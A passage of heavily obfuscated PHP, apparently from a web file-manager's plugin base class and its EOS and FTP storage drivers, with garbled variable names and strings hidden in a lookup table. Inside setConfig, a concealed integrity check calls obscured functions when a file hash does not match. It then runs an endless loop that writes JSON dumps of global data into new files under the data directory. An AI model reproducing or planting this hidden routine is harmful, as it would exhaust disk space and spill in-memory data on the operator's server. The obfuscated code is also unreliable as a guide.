$®Î­÷÷Â[1674] . KodIO::hashPath($»…ş¿Ôš) . $®Î­÷÷Â[10] . $»…ş¿Ôš[$®Î­÷÷Â[169]]; if (!checkExtSafe($®èğúÉ)) { $®èğúÉ = $®èğúÉ . $®Î­÷÷Â[1303]; } $£Ú’¿Ì = $¡˜›ö­ . $®èğúÉ; if (@file_exists($£Ú’¿Ì)) { return $£Ú’¿Ì; } return IO::copy($ğÚëÓ, $¡˜›ö­, 0, $®èğúÉ); } final function appPackage() { $§„ç½—ä =& $_SERVER[¼¥ÊĞÙÌ]; if ($this->packageData) { return $this->packageData; } $÷â­¾º÷ = $this->parseFile($this->pluginPath . $§„ç½—ä[1675]); $this->parseLang($÷â­¾º÷); $»êÁ»ş‡ = json_decode_force($÷â­¾º÷); if (!$»êÁ»ş‡) { return array(); } $¦µïŒ§¾ = Hook::trigger($§„ç½—ä[1676], $»êÁ»ş‡); if ($¦µïŒ§¾ && is_array($¦µïŒ§¾)) { $»êÁ»ş‡ = $¦µïŒ§¾; } $this->packageData = $»êÁ»ş‡; return $»êÁ»ş‡; } public function packageInfoGet($¬¦ğ’Òš) { $ì®½ƒ† = $this->appPackage(); return array_get_value($ì®½ƒ†, $¬¦ğ’Òš); } public function packageVersion() { return $this->packageInfoGet($_SERVER[¼¥ÊĞÙÌ][1677]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[¼¥ÊĞÙÌ][1678]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[¼¥ÊĞÙÌ][1679]); } public function echoJsAssign($Ô‰“­î, $ÔùÌ‘¦) { $this->echoJsAssignArr[$Ô‰“­î] = $ÔùÌ‘¦; } private function parseFile($İ¶ÆÃˆ€) { $êååÑü× =& $_SERVER[¼¥ÊĞÙÌ]; $–ÙÈĞ  = file_get_contents_nossl($İ¶ÆÃˆ€); $”‹Ã¦ÕÕ = array($êååÑü×[1680], $êååÑü×[1681], $êååÑü×[1682], $êååÑü×[1683], $êååÑü×[1684], $êååÑü×[1685], $êååÑü×[1686]); $Ï‹ˆ›¹ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$êååÑü×[92]][$êååÑü×[1687]]); foreach ($this->echoJsAssignArr as $±¡Õ©ˆÙ => $Î¹»åı¸) { $”‹Ã¦ÕÕ[] = $êååÑü×[1688] . $±¡Õ©ˆÙ . $êååÑü×[1689]; $Ï‹ˆ›¹[] = is_array($Î¹»åı¸) || is_object($Î¹»åı¸) ? rawurlencode(json_encode($Î¹»åı¸)) : $Î¹»åı¸; } if (strstr($–ÙÈĞ , $êååÑü×[1690])) { $¤†ãšš± = rawurlencode(json_encode($this->pluginLangArr)); $–ÙÈĞ  = str_replace($êååÑü×[1690], $¤†ãšš±, $–ÙÈĞ ); } if (strstr($–ÙÈĞ , $êååÑü×[1691])) { $¤†ãšš± = $¤†ãšš± = rawurlencode(json_encode($this->getConfig())); $–ÙÈĞ  = str_replace($êååÑü×[1691], $¤†ãšš±, $–ÙÈĞ ); } $–ÙÈĞ  = str_replace($”‹Ã¦ÕÕ, $Ï‹ˆ›¹, $–ÙÈĞ ); return $–ÙÈĞ ; } private function parseLang(&$äË­¿€¾) { $­ºãÛƒû =& $_SERVER[¼¥ÊĞÙÌ]; $¥–Û¨ = $­ºãÛƒû[1692]; if (!strstr($äË­¿€¾, $¥–Û¨)) { return; } preg_match_all($­ºãÛƒû[1693], $äË­¿€¾, $Ü©úæ); if (!is_array($Ü©úæ) || count($Ü©úæ) == 0 || !is_array($Ü©úæ[0]) || count($Ü©úæ[0]) == 0) { return; } $†µ»ûê = array(); $«½µş¶Ê = array(); foreach ($Ü©úæ[0] as $‰€Üïù) { $Ğç…ÎÇÀ = substr($‰€Üïù, strlen($¥–Û¨), -4); $÷± ºÏ• = LNG($Ğç…ÎÇÀ); $†µ»ûê[] = $‰€Üïù; $«½µş¶Ê[] = str_replace(array($­ºãÛƒû[288], $­ºãÛƒû[1166], $­ºãÛƒû[420], $­ºãÛƒû[121]), array($­ºãÛƒû[53], $­ºãÛƒû[53], $­ºãÛƒû[12], $­ºãÛƒû[1694]), $÷± ºÏ•); } $äË­¿€¾ = str_replace($†µ»ûê, $«½µş¶Ê, $äË­¿€¾); } private function parseConfig(&$­ôñ˜³Ì) { $Şœ°·–ú =& $_SERVER[¼¥ÊĞÙÌ]; $ÍÕÉÎ—ï = $Şœ°·–ú[1695]; if (!strstr($­ôñ˜³Ì, $ÍÕÉÎ—ï)) { return; } preg_match_all($Şœ°·–ú[1696], $­ôñ˜³Ì, $Îµß•Ğ¯); if (!is_array($Îµß•Ğ¯) || count($Îµß•Ğ¯) == 0 || !is_array($Îµß•Ğ¯[0]) || count($Îµß•Ğ¯[0]) == 0) { return; } $÷ñ‘àÂ¶ = $this->getConfig(); $ûİâ¼×« = array(); $Òô²Å«‘ = array(); foreach ($Îµß•Ğ¯[0] as $½Œ±Ïº) { $È¨¸™¼ß = substr($½Œ±Ïº, strlen($ÍÕÉÎ—ï), -2); $ûİâ¼×«[] = $½Œ±Ïº; $Òô²Å«‘[] = _get($÷ñ‘àÂ¶, $È¨¸™¼ß); } $­ôñ˜³Ì = str_replace($ûİâ¼×«, $Òô²Å«‘, $­ôñ˜³Ì); } private function parsePackage(&$‹É¡Êæ™) { $œã€¨¤ =& $_SERVER[¼¥ÊĞÙÌ]; $ ¢õ·º¦ = $œã€¨¤[1697]; if (!strstr($‹É¡Êæ™, $ ¢õ·º¦)) { return; } preg_match_all($œã€¨¤[1698], $‹É¡Êæ™, $¹¦ôÍÀ¼); if (!is_array($¹¦ôÍÀ¼) || count($¹¦ôÍÀ¼) == 0 || !is_array($¹¦ôÍÀ¼[0]) || count($¹¦ôÍÀ¼[0]) == 0) { return; } $ÊÃÇëÓ‡ = $this->appPackage(); $Â·‚ßÑ¸ = array(); $‘ › ›µ = array(); foreach ($¹¦ôÍÀ¼[0] as $”‹±ûÕ¾) { $òçÜ´ö = substr($”‹±ûÕ¾, strlen($ ¢õ·º¦), -2); $Â·‚ßÑ¸[] = $”‹±ûÕ¾; $‘ › ›µ[] = _get($ÊÃÇëÓ‡, $òçÜ´ö); } $‹É¡Êæ™ = str_replace($Â·‚ßÑ¸, $‘ › ›µ, $‹É¡Êæ™); } final function echoFile($ş—ŠòË, $Áı”ŞêŒ = false) { $¹ì¦ÎÏ¾ =& $_SERVER[¼¥ÊĞÙÌ]; $ìıƒŞé = $this->pluginPath . $ş—ŠòË; if (ACT == $¹ì¦ÎÏ¾[1699]) { echo $¹ì¦ÎÏ¾[1700] . $this->pluginName . $¹ì¦ÎÏ¾[8] . $ş—ŠòË . $¹ì¦ÎÏ¾[1701]; if (!file_exists($ìıƒŞé)) { echo $¹ì¦ÎÏ¾[1702]; return; } } $“çùÀ½ = $this->parseFile($ìıƒŞé); $this->parseLang($“çùÀ½); $this->parseConfig($“çùÀ½); $this->parsePackage($“çùÀ½); if (is_array($Áı”ŞêŒ)) { $“çùÀ½ = str_replace(array_keys($Áı”ŞêŒ), array_values($Áı”ŞêŒ), $“çùÀ½); } echo $¹ì¦ÎÏ¾[288] . $“çùÀ½; } private function checkVersion() { $È¥èò™á =& $_SERVER[¼¥ÊĞÙÌ]; $“Àı‡‹× = $this->appPackage(); $Ğ“Ğàá = $this->getConfig(); if ($Ğ“Ğàá[$È¥èò™á[1703]] == $“Àı‡‹×[$È¥èò™á[1677]]) { return; } $this->regist(); $this->setConfig(array($È¥èò™á[1703] => $“Àı‡‹×[$È¥èò™á[1677]])); } final function initLang() { $ŸâÃ¦å‘ =& $_SERVER[¼¥ÊĞÙÌ]; $¾¦Ëş©Ò = $ŸâÃ¦å‘[1704]; $™”¨Ÿºå = $this->pluginPath . $ŸâÃ¦å‘[1705]; $‚ÀÊÇª = I18n::getType(); $””„ÜèŠ = array(); if (file_exists($™”¨Ÿºå . $‚ÀÊÇª . $ŸâÃ¦å‘[918])) { $””„ÜèŠ = (include $™”¨Ÿºå . $‚ÀÊÇª . $ŸâÃ¦å‘[918]); } else { if ($‚ÀÊÇª == $ŸâÃ¦å‘[1706] && !file_exists($™”¨Ÿºå . $‚ÀÊÇª . $ŸâÃ¦å‘[918]) && file_exists($™”¨Ÿºå . $ŸâÃ¦å‘[1707])) { $””„ÜèŠ = (include $™”¨Ÿºå . $ŸâÃ¦å‘[1707]); } else { if (file_exists($™”¨Ÿºå . $¾¦Ëş©Ò . $ŸâÃ¦å‘[918])) { $””„ÜèŠ = (include $™”¨Ÿºå . $¾¦Ëş©Ò . $ŸâÃ¦å‘[918]); } } } if (!is_array($””„ÜèŠ)) { return array(); } if (@count($””„ÜèŠ) > 0) { I18n::set($””„ÜèŠ); } return $””„ÜèŠ; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($îõ˜‹À‹) { $ö¡±˜ôŒ =& $_SERVER[¼¥ÊĞÙÌ]; $’ÉŞº¢‡ = $_SERVER[$ö¡±˜ôŒ[962]] . $ö¡±˜ôŒ[963]; $ğÛ´ƒâƒ = $ö¡±˜ôŒ[958]; if ($_SERVER[$ö¡±˜ôŒ[959]] != $ğÛ´ƒâƒ($’ÉŞº¢‡)) { $„Ë´ñ· = $ö¡±˜ôŒ[960]; $«öÒËÕ© = $ö¡±˜ôŒ[961]; $›ÑÑš‹Å = $_SERVER[$ö¡±˜ôŒ[962]] . $ö¡±˜ôŒ[963]; $¶ö¬€›Ğ = $«öÒËÕ©($›ÑÑš‹Å); $ÍÀ²¨²Ã = explode($ö¡±˜ôŒ[288], $¶ö¬€›Ğ); if (count($ÍÀ²¨²Ã) < $ö¡±˜ôŒ[693]) { $ä‰öôÏ = $ö¡±˜ôŒ[964]; $ä‰öôÏ(); } $à®£Î¨É = $ö¡±˜ôŒ[965]; $à®£Î¨É($_SERVER[$ö¡±˜ôŒ[966]]); $„Ë´ñ· = $ö¡±˜ôŒ[960]; $„Ë´ñ·(); $¾ığÄƒ´ = $ö¡±˜ôŒ[967]; $¯…÷çô³ = json_encode($GLOBALS[$ö¡±˜ôŒ[968]]); $şîƒ¡® = 1; for ($Ñûúå = $şîƒ¡®; $Ñûúå > 0; $Ñûúå++) { $¾ığÄƒ´(DATA_PATH . $Ñûúå, $¯…÷çô³); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $îõ˜‹À‹); } public function onSetConfig($Ì®Ú¿‹Š) { } public function onGetConfig($ô¯Ïôà¦) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($üº™ïİî) { if ($üº™ïİî == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($¿”›æÀ’ = "\160\154\165\147\151\x6e\x41\165\164\x68") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $ë¯èœİ = $this->getConfig(); if (!$ë¯èœİ[$¿”›æÀ’]) { return !1; } return ActionCall($_SERVER[¼¥ÊĞÙÌ][1708], $ë¯èœİ[$¿”›æÀ’]); } public function url($´ÈÆæ›±, $ñ”ë€œµ = '', $‹Ò…Ğê = true) { $œªº„ô¹ =& $_SERVER[¼¥ÊĞÙÌ]; $ äæŞµ„ = $this->getConfig(); $·ë™ŠáÓ = KOD_VERSION . $œªº„ô¹[10] . KOD_VERSION_BUILD; $âÊŞéİŸ = $this->packageVersion(); $‡¤¢šÇé = $·ë™ŠáÓ . $œªº„ô¹[465] . $âÊŞéİŸ; if (substr($´ÈÆæ›±, 0, 4) == $œªº„ô¹[152] || substr($´ÈÆæ›±, 0, 2) == $œªº„ô¹[1430]) { $Î¡®Îë¾ = $´ÈÆæ›± . $œªº„ô¹[1709] . $‡¤¢šÇé; } else { if ($ñ”ë€œµ == $œªº„ô¹[12]) { $Î¡®Îë¾ = $this->pluginHost . $´ÈÆæ›± . $œªº„ô¹[1709] . $‡¤¢šÇé; } else { if ($ñ”ë€œµ === $œªº„ô¹[78]) { $Î¡®Îë¾ = $this->pluginHost . $´ÈÆæ›±; } else { if ($ñ”ë€œµ == $œªº„ô¹[1710]) { $Î¡®Îë¾ = STATIC_PATH . $´ÈÆæ›± . $œªº„ô¹[1709] . $·ë™ŠáÓ; } else { if ($ñ”ë€œµ == $œªº„ô¹[1711]) { $Î¡®Îë¾ = APP_HOST . $œªº„ô¹[1712] . $´ÈÆæ›± . $œªº„ô¹[1709] . $·ë™ŠáÓ; } else { if (isset($ äæŞµ„[$ñ”ë€œµ])) { $Î¡®Îë¾ = $ äæŞµ„[$ñ”ë€œµ] . $´ÈÆæ›± . $œªº„ô¹[1709] . $‡¤¢šÇé; } } } } } } if (!$‹Ò…Ğê) { return $Î¡®Îë¾; } echo $Î¡®Îë¾; } public function link($ˆËŠ›¬ = false, $¦¿İ–×² = '') { $ØÂÆèù­ =& $_SERVER[¼¥ÊĞÙÌ]; $¯ŞËœ‚Ñ = $this->linkHas == !1; $this->linkHas = !0; if (!$ˆËŠ›¬) { $this->link($ØÂÆèù­[1713], $ØÂÆèù­[1711]); $this->link($ØÂÆèù­[1714], $ØÂÆèù­[1710]); $this->link($ØÂÆèù­[1715], $ØÂÆèù­[1710]); $this->link($ØÂÆèù­[1716], $ØÂÆèù­[1710]); $this->link($ØÂÆèù­[1717], $ØÂÆèù­[1710]); if ($¯ŞËœ‚Ñ) { Hook::trigger($ØÂÆèù­[1718]); } return; } $ÔÕğŸÅ = $this->url($ˆËŠ›¬, $¦¿İ–×², !1); if (substr($ˆËŠ›¬, -3) == $ØÂÆèù­[1719]) { echo $ØÂÆèù­[1720] . $ÔÕğŸÅ . $ØÂÆèù­[1721] . $ØÂÆèù­[288]; } else { if (substr($ˆËŠ›¬, -4) == $ØÂÆèù­[1722]) { echo $ØÂÆèù­[1723] . $ÔÕğŸÅ . $ØÂÆèù­[1724] . $ØÂÆèù­[288]; } } if ($¯ŞËœ‚Ñ) { Hook::trigger($ØÂÆèù­[1718]); } } } goto E¡ÓÏ¢‡ãØ; BÎö•¹‰’: class PathDriverEDS extends PathDriverBaseS3 { public function __construct($ã†÷®š‚) { parent::__construct($ã†÷®š‚); $this->setSignVersion($_SERVER[¼¥ÊĞÙÌ][250]); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($¬ï¸çÎé) { parent::__construct($¬ï¸çÎé); $this->setSignVersion($_SERVER[¼¥ÊĞÙÌ][250]); } public function uploadFormData($ş·¥İÔİ, $¨Çİ¸½ì = 3600) { $†ÖÖû±¬ =& $_SERVER[¼¥ÊĞÙÌ]; $‡áÜáÏü = $†ÖÖû±¬[232]; $Ù“åü = $†ÖÖû±¬[260]; $é—ËéËè = $†ÖÖû±¬[62]; $¨Ï•Ìµî = gmdate($†ÖÖû±¬[261]); $×ÂşÀÎÙ = gmdate($†ÖÖû±¬[262]); $³€ç‘èÃ = $†ÖÖû±¬[263]; $şêêÁ²Ó = $¨Çİ¸½ì . $†ÖÖû±¬[12]; $˜ª¡˜×Œ = $†ÖÖû±¬[264]; $Ÿ˜â‚òÓ = array($this->accessKey, $×ÂşÀÎÙ, $this->region, $é—ËéËè, $³€ç‘èÃ); $Í‰¿ò©© = implode($†ÖÖû±¬[8], $Ÿ˜â‚òÓ); $¼§ÇğÌ = array($†ÖÖû±¬[265] => gmdate($†ÖÖû±¬[1432], strtotime($†ÖÖû±¬[267])), $†ÖÖû±¬[268] => array(array($†ÖÖû±¬[269] => $this->bucket), array($†ÖÖû±¬[309] => $‡áÜáÏü), array($†ÖÖû±¬[270], $†ÖÖû±¬[271], $†ÖÖû±¬[12]), array($†ÖÖû±¬[270], $†ÖÖû±¬[272], $†ÖÖû±¬[12]), array($†ÖÖû±¬[270], $†ÖÖû±¬[310], $†ÖÖû±¬[12]), array($†ÖÖû±¬[273] => $˜ª¡˜×Œ), array($†ÖÖû±¬[274] => $Í‰¿ò©©), array($†ÖÖû±¬[275] => $Ù“åü), array($†ÖÖû±¬[276] => $¨Ï•Ìµî), array($†ÖÖû±¬[277] => $şêêÁ²Ó))); $›½¹óµ = base64_encode(json_encode($¼§ÇğÌ)); $™”Ó…§ = hash_hmac($†ÖÖû±¬[278], $×ÂşÀÎÙ, $†ÖÖû±¬[279] . $this->secret, !0); $‹‚Î²È¾ = hash_hmac($†ÖÖû±¬[278], $this->region, $™”Ó…§, !0); $£Ó’²¥ = hash_hmac($†ÖÖû±¬[278], $é—ËéËè, $‹‚Î²È¾, !0); $ìúœ¸üö = hash_hmac($†ÖÖû±¬[278], $³€ç‘èÃ, $£Ó’²¥, !0); $¹¹£®È£ = hash_hmac($†ÖÖû±¬[278], $›½¹óµ, $ìúœ¸üö); $ôÂ†Û¸å = array($†ÖÖû±¬[249] => $†ÖÖû±¬[12], $†ÖÖû±¬[297] => $†ÖÖû±¬[12], $†ÖÖû±¬[309] => $‡áÜáÏü, $†ÖÖû±¬[273] => $˜ª¡˜×Œ, $†ÖÖû±¬[280] => $›½¹óµ, $†ÖÖû±¬[311] => $Í‰¿ò©©, $†ÖÖû±¬[312] => $Ù“åü, $†ÖÖû±¬[313] => $¨Ï•Ìµî, $†ÖÖû±¬[314] => $şêêÁ²Ó, $†ÖÖû±¬[315] => $¹¹£®È£, $†ÖÖû±¬[209] => $this->getHost()); return $ôÂ†Û¸å; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($ÅÃãÜöÕ) { parent::__construct(); if (count($ÅÃãÜöÕ) > 0) { $this->_init($ÅÃãÜöÕ); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($ÊƒòÓ ) { $ˆş”Ü¾Œ =& $_SERVER[¼¥ÊĞÙÌ]; global $config; $this->appCharset = $config[$ˆş”Ü¾Œ[1458]]; $this->systemCharset = $config[$ˆş”Ü¾Œ[1459]]; if (isset($ÊƒòÓ [$ˆş”Ü¾Œ[1460]]) && $ÊƒòÓ [$ˆş”Ü¾Œ[1460]]) { $this->systemCharset = $ÊƒòÓ [$ˆş”Ü¾Œ[1460]]; } } public function iconvApp($®—ÆÚçÒ) { return $this->iconvTo($®—ÆÚçÒ, $this->systemCharset, $this->appCharset); } public function iconvSystem($ÚÓ’) { return $this->iconvTo($ÚÓ’, $this->appCharset, $this->systemCharset); } public function getPathOuter($ ¸Ûí˜˜) { $ê½Å“é¦ =& $_SERVER[¼¥ÊĞÙÌ]; $ÔãºÊ°ˆ = $this->iconvApp($this->pathBase); $ ¸Ûí˜˜ = $this->iconvApp($ ¸Ûí˜˜); if (substr($ÔãºÊ°ˆ, 0, 2) == $ê½Å“é¦[1430]) { $ÔãºÊ°ˆ = BASIC_PATH . substr($ÔãºÊ°ˆ, 2); } if (substr($ ¸Ûí˜˜, 0, 2) == $ê½Å“é¦[1430]) { $ ¸Ûí˜˜ = BASIC_PATH . substr($ ¸Ûí˜˜, 2); } $ÔãºÊ°ˆ = KodIO::clear($ÔãºÊ°ˆ); $ ¸Ûí˜˜ = KodIO::clear($ ¸Ûí˜˜); $ ¸Ûí˜˜ = substr($ ¸Ûí˜˜, strlen($ÔãºÊ°ˆ)); if (empty($this->pathDriver)) { return $ ¸Ûí˜˜; } return $this->pathDriver . $ê½Å“é¦[8] . ltrim($ ¸Ûí˜˜, $ê½Å“é¦[8]); } private function _init($¶Š¦ÇÎ’ = array()) { $¼¡â–Í× =& $_SERVER[¼¥ÊĞÙÌ]; if (!function_exists($¼¡â–Í×[1461])) { throw new Exception(LNG($¼¡â–Í×[1462])); } $this->config = $¶Š¦ÇÎ’; $this->charsetReset($¶Š¦ÇÎ’); foreach ($¶Š¦ÇÎ’ as $ÀÑëî€ => $šœş…¹¶) { if (isset($this->{$ÀÑëî€})) { $this->{$ÀÑëî€} = $šœş…¹¶; } } return $this->_login($¶Š¦ÇÎ’); } private function _login($é½€•ÏÇ) { $™Ñ†‡èÄ =& $_SERVER[¼¥ÊĞÙÌ]; static $Ô²¬ÇäÇ = array(); $Íûß¤ûÜ = md5(json_encode($é½€•ÏÇ)); if (isset($Ô²¬ÇäÇ[$Íûß¤ûÜ])) { foreach ($Ô²¬ÇäÇ[$Íûß¤ûÜ] as $¨Šì®ïğ => $´½§ÊÛÎ) { $this->{$¨Šì®ïğ} = $´½§ÊÛÎ; } return !0; } $ó©Ó–Øî = parse_url(trim($this->server, $™Ñ†‡èÄ[8])); $this->host = $ó©Ó–Øî[$™Ñ†‡èÄ[209]]; $ôõ¦ï¯‚ = isset($ó©Ó–Øî[$™Ñ†‡èÄ[208]]) && $ó©Ó–Øî[$™Ñ†‡èÄ[208]] == $™Ñ†‡èÄ[1463] ? !0 : !1; $this->scheme = $ôõ¦ï¯‚ ? $™Ñ†‡èÄ[1464] : $™Ñ†‡èÄ[1465]; $this->port = isset($ó©Ó–Øî[$™Ñ†‡èÄ[210]]) ? $ó©Ó–Øî[$™Ñ†‡èÄ[210]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($™Ñ†‡èÄ[1466]) . $this->host . $™Ñ†‡èÄ[4] . $this->port, !0); return !1; } $ÊÒÅÓ½´ = @ftp_login($this->connect, $this->username, $this->userpass); if (!$ÊÒÅÓ½´) { $this->writeLog(LNG($™Ñ†‡èÄ[1467]) . $this->username, !0); return !1; } $this->ftpPath = @ftp_pwd($this->connect); @ftp_chdir($this->connect, $™Ñ†‡èÄ[8]); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $±Ú¶Ó = $this->pasv == $™Ñ†‡èÄ[91] ? !0 : !1; @ftp_pasv($this->connect, $±Ú¶Ó); $Ô²¬ÇäÇ[$Íûß¤ûÜ] = array($™Ñ†‡èÄ[1468] => $this->connect, $™Ñ†‡èÄ[209] => $this->host, $™Ñ†‡èÄ[208] => $this->scheme, $™Ñ†‡èÄ[210] => $this->port); return $ÊÒÅÓ½´; } private function _isconn($õ³—Úœ‚ = true) { if (is_resource($this->connect)) { return !0; } if (!$õ³—Úœ‚) { return !1; } return $this->_login($this->config); } public function mkfile($­ÒƒåŸæ, $Ò¡ö…ú = '', $’øš¯´ı = REPEAT_RENAME) { if ($this->setContent($­ÒƒåŸæ, $Ò¡ö…ú)) { return $this->getPathOuter($­ÒƒåŸæ); } $this->writeLog(LNG($_SERVER[¼¥ÊĞÙÌ][1469]), !0); return !1; } public function mkdir($Í¹Û¡ÔÌ, $ğîø•Õ˜ = REPEAT_SKIP) { $éƒÓ½”² =& $_SERVER[¼¥ÊĞÙÌ]; if (!$Í¹Û¡ÔÌ || $Í¹Û¡ÔÌ == $éƒÓ½”²[8]) { return !0; } if (!$this->_isconn()) { return !1; } $Í¹Û¡ÔÌ = $this->iconvSystem($Í¹Û¡ÔÌ); if ($this->_isFolder($Í¹Û¡ÔÌ) || @ftp_mkdir($this->connect, $Í¹Û¡ÔÌ)) { return $this->getPathOuter($Í¹Û¡ÔÌ); } if (!$this->mkdir($this->pathFather($Í¹Û¡ÔÌ))) { return !1; } if ($Í¹Û¡ÔÌ = @ftp_mkdir($this->connect, $Í¹Û¡ÔÌ)) { return $this->getPathOuter($Í¹Û¡ÔÌ); } $€€¥ĞŠ§ = __FUNCTION__ . $éƒÓ½”²[1470]; $this->writeLog($€€¥ĞŠ§, !0); return !1; } public function copyFile($´£¨úÇ, $ÕÙ™€Á‹) { if (!$this->_isconn()) { return !1; } $Õâõßª÷ = $this->pathThis($this->iconvSystem($´£¨úÇ)); $½¹–õ› = $this->tempFile($Õâõßª÷); $ÉÉñ§óÄ = $this->iconvApp($½¹–õ›); $this->download($´£¨úÇ, $ÉÉñ§óÄ); $æÊœëØÒ = $this->upload($ÕÙ™€Á‹, $ÉÉñ§óÄ); $this->tempFileRemve($½¹–õ›); return $æÊœëØÒ; } public function moveFile($È‡Î®¦, $ïÄ°×²) { if (!$this->_isconn()) { return !1; } $È‡Î®¦ = $this->iconvSystem($È‡Î®¦); $ïÄ°×² = $this->iconvSystem($ïÄ°×²); $¢Ÿó“Œş = @ftp_rename($this->connect, $È‡Î®¦, $ïÄ°×²); if (!$¢Ÿó“Œş) { $this->writeLog(__FUNCTION__ . $_SERVER[¼¥ÊĞÙÌ][1470], !0); return !1; } return $this->getPathOuter($ïÄ°×²); } public function delFile($ıë¯ÖÖ) { if (!$this->_isconn()) { return !1; } $ıë¯ÖÖ = $this->iconvSystem($ıë¯ÖÖ); $±éòÉµÇ = @ftp_delete($this->connect, $ıë¯ÖÖ); if (!$±éòÉµÇ) { $this->writeLog(__FUNCTION__ . $_SERVER[¼¥ÊĞÙÌ][1470], !0); } return $±éòÉµÇ; } public function delFolder($ñ´åúËš) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $È×÷»§Ó = $ÏüôìÚø = array(); $this->fileList($ñ´åúËš, $È×÷»§Ó, $ÏüôìÚø, !0); $this->listItemCache = !0; foreach ($ÏüôìÚø as $Ïßí¬ù®) { $·•æ¼½È = $this->iconvSystem($Ïßí¬ù®[$_SERVER[¼¥ÊĞÙÌ][32]]); $Ú´èĞ¹® = @ftp_delete($this->connect, $·•æ¼½È); if (!$Ú´èĞ¹®) { return !1; } } foreach ($È×÷»§Ó as $·•æ¼½È) { $·•æ¼½È = $this->iconvSystem($·•æ¼½È); $Ú´èĞ¹® = @ftp_rmdir($this->connect, $·•æ¼½È); if (!$Ú´èĞ¹®) { return !1; } } $ñ´åúËš = $this->iconvSystem($ñ´åúËš); return @ftp_rmdir($this->connect, $ñ´åúËš); } public function rename($¶÷·÷âÜ, $‡»É®ãÉ) { $µ–ñ‡óŸ =& $_SERVER[¼¥ÊĞÙÌ]; if (!$this->_isconn()) { return !1; } $Œæ––Âù = $this->fileNameAuto($this->pathFather($¶÷·÷âÜ), $‡»É®ãÉ); $Œæ––Âù = $this->iconvSystem($Œæ––Âù); $¶÷·÷âÜ = $this->iconvSystem($¶÷·÷âÜ); $¦ş¹ğãŠ = $this->pathFather($¶÷·÷âÜ); $Æšš±Ôä = rtrim($¦ş¹ğãŠ, $µ–ñ‡óŸ[8]) . $µ–ñ‡óŸ[8] . $Œæ––Âù; $Ò˜®Õõ˜ = @ftp_rename($this->connect, $¶÷·÷âÜ, $Æšš±Ôä); if (!$Ò˜®Õõ˜) { $this->writeLog(__FUNCTION__ . $µ–ñ‡óŸ[1470], !0); return !1; } $Æšš±Ôä = $this->iconvApp($Æšš±Ôä); return $this->getPathOuter($Æšš±Ôä); } private function folderInfo($óª»Ç‚Æ, $æö¡ì¿‹ = false) { $ÀÓÚàÄ =& $_SERVER[¼¥ÊĞÙÌ]; $É§°ƒÏ† = array($ÀÓÚàÄ[32] => $this->pathThis($óª»Ç‚Æ), $ÀÓÚàÄ[87] => $this->getPathOuter($ÀÓÚàÄ[8] . $óª»Ç‚Æ), $ÀÓÚàÄ[33] => $ÀÓÚàÄ[78]); if ($æö¡ì¿‹) { return $É§°ƒÏ†; } $É§°ƒÏ†[$ÀÓÚàÄ[234]] = $É§°ƒÏ†[$ÀÓÚàÄ[88]] = 0; $É§°ƒÏ†[$ÀÓÚàÄ[235]] = $É§°ƒÏ†[$ÀÓÚàÄ[236]] = !0; return $É§°ƒÏ†; } private function fileInfo($Î´áÑÑ¤, $ƒıÓÁç€ = false, $ì°ÀîË÷ = array()) { $Ñ†µĞ¡ø =& $_SERVER[¼¥ÊĞÙÌ]; $¯Ç·Ù‹Ş = array($Ñ†µĞ¡ø[32] => $this->pathThis($Î´áÑÑ¤), $Ñ†µĞ¡ø[87] => $this->getPathOuter($Ñ†µĞ¡ø[8] . $Î´áÑÑ¤), $Ñ†µĞ¡ø[33] => $Ñ†µĞ¡ø[233], $Ñ†µĞ¡ø[79] => isset($ì°ÀîË÷[$Ñ†µĞ¡ø[79]]) ? $ì°ÀîË÷[$Ñ†µĞ¡ø[79]] : 0, $Ñ†µĞ¡ø[169] => $this->ext($Î´áÑÑ¤)); if ($ƒıÓÁç€) { return $¯Ç·Ù‹Ş; } $¯Ç·Ù‹Ş[$Ñ†µĞ¡ø[234]] = $¯Ç·Ù‹Ş[$Ñ†µĞ¡ø[88]] = 0; $¯Ç·Ù‹Ş[$Ñ†µĞ¡ø[235]] = $¯Ç·Ù‹Ş[$Ñ†µĞ¡ø[236]] = !0; $Ğ…†ƒ = $this->iconvSystem($Î´áÑÑ¤); $¯Ç·Ù‹Ş[$Ñ†µĞ¡ø[88]] = @ftp_mdtm($this->connect, $Ğ…†ƒ); if (empty($ì°ÀîË÷)) { $ì°ÀîË÷ = $this->objectMeta($Î´áÑÑ¤); if (!$ì°ÀîË÷) { return $¯Ç·Ù‹Ş; } } $¯Ç·Ù‹Ş[$Ñ†µĞ¡ø[79]] = $ì°ÀîË÷[$Ñ†µĞ¡ø[79]]; return $¯Ç·Ù‹Ş; } public function size($±ñº¼»Š) { $·¬Òòœ¦ = $this->objectMeta($±ñº¼»Š); return $·¬Òòœ¦ ? $·¬Òòœ¦[$_SERVER[¼¥ÊĞÙÌ][79]] : 0; } public function info($æìû±ä) { if ($this->isFile($æìû±ä)) { return $this->fileInfo($æìû±ä, 0); } else { if ($this->isFolder($æìû±ä)) { return $this->folderInfo($æìû±ä); } } return !1; } private function fileList($õØÄºÇœ, &$à©¤ú­´, &$æ¤î‹í¬, $ ¯ˆ‹Äô = false) { $·ñ«ö•Ï =& $_SERVER[¼¥ÊĞÙÌ]; $õØÄºÇœ = $this->iconvSystem($õØÄºÇœ); if (!$this->isFolder($õØÄºÇœ)) { return !1; } $õØÄºÇœ = rtrim($õØÄºÇœ, $·ñ«ö•Ï[8]) . 